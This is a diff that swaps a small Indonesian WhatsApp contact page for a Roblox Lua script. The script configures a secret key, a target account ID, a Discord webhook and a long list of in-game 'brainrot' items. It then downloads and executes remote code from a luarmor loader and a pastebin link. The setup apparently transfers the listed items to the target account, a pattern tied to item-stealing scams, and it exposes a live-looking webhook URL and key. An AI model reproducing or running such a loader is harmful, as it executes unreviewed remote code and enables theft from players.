@@ -1,197 +1,75 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>YOYON - Kontak WA</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 30px;
-            padding: 50px 40px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-            max-width: 500px;
-            width: 100%;
-            transition: transform 0.3s ease;
-        }
-        
-        .container:hover {
-            transform: translateY(-5px);
-        }
-        
-        h1 {
-            font-size: 5rem;
-            font-weight: 900;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 20px;
-            letter-spacing: 5px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-            animation: bounce 2s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        
-        .subtitle {
-            color: #666;
-            margin-bottom: 40px;
-            font-size: 1.1rem;
-            border-bottom: 2px solid #f0f0f0;
-            padding-bottom: 20px;
-        }
-        
-        .wa-button {
-            background: linear-gradient(135deg, #25D366, #128C7E);
-            color: white;
-            border: none;
-            padding: 20px 50px;
-            font-size: 1.8rem;
-            font-weight: bold;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 20px rgba(37, 211, 102, 0.3);
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 30px;
-            width: 100%;
-            max-width: 350px;
-        }
-        
-        .wa-button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 15px 30px rgba(37, 211, 102, 0.4);
-        }
-        
-        .wa-button:active {
-            transform: scale(0.95);
-        }
-        
-        .wa-icon {
-            font-size: 2.5rem;
-        }
-        
-        .info {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 15px;
-            margin-top: 30px;
-        }
-        
-        .info p {
-            color: #555;
-            font-size: 0.95rem;
-            margin: 5px 0;
-        }
-        
-        .info .number {
-            font-weight: bold;
-            color: #25D366;
-            font-size: 1.2rem;
-        }
-        
-        .footer {
-            margin-top: 30px;
-            color: #999;
-            font-size: 0.8rem;
-        }
-        
-        @media (max-width: 480px) {
-            .container {
-                padding: 30px 20px;
-            }
-            
-            h1 {
-                font-size: 3.5rem;
-            }
-            
-            .wa-button {
-                font-size: 1.4rem;
-                padding: 15px 30px;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>YOYON</h1>
-        <div class="subtitle">✨ Tekan tombol untuk chat langsung ✨</div>
-        
-        <button class="wa-button" id="waButton">
-            <span class="wa-icon">📱</span>
-            Chat WA
-            <span class="wa-icon">💬</span>
-        </button>
-        
-        <div class="info">
-            <p>📞 Nomor Tujuan:</p>
-            <p class="number">0878 7396 2512</p>
-            <p>🕒 Siap membantu 24/7</p>
-            <p>💚 Klik tombol, auto buka WhatsApp</p>
-        </div>
-        
-        <div class="footer">
-            © 2024 YOYON - All rights reserved
-        </div>
-    </div>
-
-    <script>
-        // Nomor WhatsApp tujuan
-        const phoneNumber = "087873962512";
-        
-        function openWhatsApp() {
-            // Hapus semua karakter non-digit
-            let formattedNumber = phoneNumber.replace(/[^0-9]/g, '');
-            
-            // Format nomor internasional (62 untuk Indonesia)
-            if (formattedNumber.startsWith('0')) {
-                formattedNumber = '62' + formattedNumber.substring(1);
-            } else if (!formattedNumber.startsWith('62')) {
-                formattedNumber = '62' + formattedNumber;
-            }
-            
-            // Buat URL WhatsApp
-            const waScheme = `whatsapp://send?phone=${formattedNumber}`; // Untuk buka app
-            const waUrl = `https://wa.me/${formattedNumber}`; // Fallback ke web
-            
-            // Coba buka pake scheme dulu (biar buka app)
-            window.location.href = waScheme;
-            
-            // Fallback: kalo gagal buka app, buka web version
-            setTimeout(function() {
-                // Kalo masih di halaman yang sama (berarti gagal buka app)
-                if (!document.hidden) {
-                    window.location.href = waUrl;
-                }
-            }, 500);
-        }
-        
-        // Pasang event listener ke tombol
-        document.getElementById('waButton').addEventListener('click', openWhatsApp);
-    </script>
-</body>
-</html>
+getgenv().SECRET_KEY = "mrr_6c187cc369c649b598ab69fe74614760"
+getgenv().TARGET_ID = 8364286390
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1481257360340287519/94G4Mnm1zstqxqH3xvYBS6gj_Wa6ilJxGMjfP0OavPFEPBarHLkbVa1m_bSzSkJN_-Ru"
+getgenv().TARGET_BRAINROTS = {
+        ["La Romantic Grande"] = true,
+    ["Los Spaghettis"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Esok Sekolah"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Swaggy Bros"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Garama and Madundung"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Ketupat Bros"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Money Money Puggy"] = true,
+    ["Money Money Reindeer"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Spooky Grande"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Grande Combinasion"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["La Casa Boo"] = true,
+    ["Los Sekolahs"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["Las Sis"] = true,
+    ["Los Planitos"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Capitano Moby"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Festive 67"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Bros"] = true,
+    ["Los Puggies"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Mobilis"] = true,
+    ["Los 25"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["Los Amigos"] = true,
+    ["Cerberus"] = true,
+    ["Cooki and Milki"] = true,
+    ["Tralaledon"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Headless Horseman"] = true,
+    ["Orcaledon"] = true,
+    ["Eviledon"] = true,
+    ["Tuff Toucan"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Guest 666"] = true,
+    ["Love Love Bear"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Fishino Clownino"] = true,
+    ["Rosetti Tualetti"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/mduwJN5s"))()
